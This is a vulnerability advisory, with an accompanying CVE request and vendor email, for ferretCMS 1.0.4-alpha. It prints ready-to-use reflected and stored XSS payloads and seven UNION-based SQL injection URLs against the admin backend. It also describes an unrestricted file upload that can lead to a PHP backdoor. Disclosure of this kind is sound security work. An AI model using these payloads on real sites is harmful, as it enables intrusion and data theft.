Advisory:
Advisory ID: SROEADV-2015-10
Author: Steffen Rösemann
Affected Software: ferretCMS v. 1.0.4-alpha
Vendor URL: <https://github.com/JRogaishio/ferretCMS>
Vendor Status: vendor will patch eventually
CVE-ID: -

Tested on:

- Firefox 35, Iceweasel 31
- Mac OS X 10.10, Kali Linux 1.0.9a

==========================
Vulnerability Description:
==========================

The content management system ferretCMS v.1.0.4, which is currently in
alpha development stage, suffers from multiple stored/reflecting XSS- and
SQLi-vulnerabilities in its administrative backend.
Moreover, there exists the possibility to upload arbitrary files via the
administrative backend, which can be executed by unauthenticated users, too.

==================
Technical Details:
==================

A reflecting XSS vulnerability can be found in the parameter "action" used
in the file admin.php:

http://
{TARGET}/admin.php?type=search&action=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E

Stored XSS vulnerabilities resides in the logging functionality of
ferretCMS. On the administrative backend, the administrator has the
opportunity to watch events stored in a log. An event, that gets logged,
are login-attempts to the administrative backend, where the used username
is displayed, too. An attacker can abuse this, by trying to log in with
JavaScript-code instead of a username. That code gets executed in the logs.

Login-form is located here: <http://{TARGET}/admin.php>

XSS gets executed here: <http://{TARGET}/admin.php?type=log&action=read>

Another stored XSS vulnerability can be found in the pagetitle of a new
blog entry that is created by the administrator:

vulnerable form: <http://{TARGET}/admin.php?type=page&action=insert&p=>

XSS gets executed here: <http://{TARGET}/admin.php?type=page&action=read>

The following URLs are prone to SQL injection attacks:

http://
{TARGET}/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+

http://
{TARGET}/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,4+--+

http://
{TARGET}/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database%28%29,3,4,5,version%28%29,7,8,9+--+

http://
{TARGET}/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database%28%29,version%28%29,4+--+

http://
{TARGET}/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,user%28%29,5+--+

http://
{TARGET}/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+

http://
{TARGET}/admin.php?type=page&action=update&p=1+and+substring%28version%28%29,1,1%29=5+--+

Last but not least there is a file-upload functionality in the
administrative backend of ferretCMS. The administrator can upload arbitrary
files here via the following URL:

<http://localhost/ferretCMS/admin.php?type=uploader&action=upload>

Any unauthenticated user can execute/read those files that had been
uploaded by visiting the following URL:

[http://{TARGET}/custom/uploads/{NAME_OF_THE_UPLOADED_FILE}](http://{TARGET}/custom/uploads/%7BNAME_OF_THE_UPLOADED_FILE%7D)

=========
Solution:
=========

Vendor responded, issues will be patched eventually.

Subject: CVE-Request -- ferretCMS v.1.0.4-alpha -- Multiple reflecting/stored
 XSS- and SQLi-vulnerabilities, unrestricted file upload

Hi Josh, Steve, vendors, list.

I found multiple reflecting/stored XSS- and SQLi-vulnerabilities as well as
an unrestricted file upload in the CMS ferretCMS v.1.0.4 which is currently
in the alpha development stage.

============
Reflecting XSS
============

http://
{TARGET}/admin.php?type=search&action=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E

============
Stored XSS
============

1.
via login-form of the administrative backend, input field for username:

http://{TARGET}/admin.php

executed here in the logevent functionality in the backend:

http://{TARGET}/admin.php?type=log&action=read

2.

via the new blog-post form, input field for pagetitle:

http://{TARGET}/admin.php?type=page&action=insert&p=

executed, for example, here:

http://{TARGET}/admin.php?type=page&action=read

============
SQLi
============

http://
{TARGET}/admin.php?type=site&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+

http://
{TARGET}/admin.php?type=customkey&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,4+--+

http://
{TARGET}/admin.php?type=account&action=update&p=1+and+1=2+union+select+1,database%28%29,3,4,5,version%28%29,7,8,9+--+

http://
{TARGET}/admin.php?type=plugin&action=update&p=1+and+1=2+union+select+1,database%28%29,version%28%29,4+--+

http://
{TARGET}/admin.php?type=template&action=update&p=1+and+1=2+union+select+1,version%28%29,database%28%29,user%28%29,5+--+

http://
{TARGET}/admin.php?type=permissiongroup&action=update&p=1+and+1=2+union+select+1,version%28%29,3,4+--+

http://
{TARGET}/admin.php?type=page&action=update&p=1+and+substring%28version%28%29,1,1%29=5+--+

==================
Unrestricted file upload
==================

An administrator has the opportunity to upload arbitrary files via a form
located here on a common ferretCMS installation:

http://{TARGET}/admin.php?type=uploader&action=upload

As these files aren't renamed and stored in the following location, any
unauthenticated user is able to read/execute those files, too:

http://{TARGET}/custom/uploads/{NAME_OF_THE_FILE}

Could you please assign a CVE-ID / CVE-IDs for these issues.

Thank you very much!

Greetings.

Steffen Rösemann

Dear Jacob.

I found multiple vulnerabilities in your CMS ferretCMS v. 1.0.4-alpha. These issues involve stored/reflecting XSS- and SQL injection-vulnerabilities as well as an unrestricted file-upload, which can be used to compromise the server running ferretCMS by uploading a PHP backdoor.

Please tell me if you are interested in patching the vulnerabilities. If you are interested, please provide me a way where I can send my report to.

I am going to release a security advisory on my blog (without technical details). If you don't respond until 30th January 2015, I will release the technical details as well and send the issues to the security mailing list FullDisclosure.

See here: <http://sroesemann.blogspot.de/2015/01/sroeadv-2015-10.html>

I hope I can help improving the security of your project.

Greetings from Germany.

Steffen Rösemann
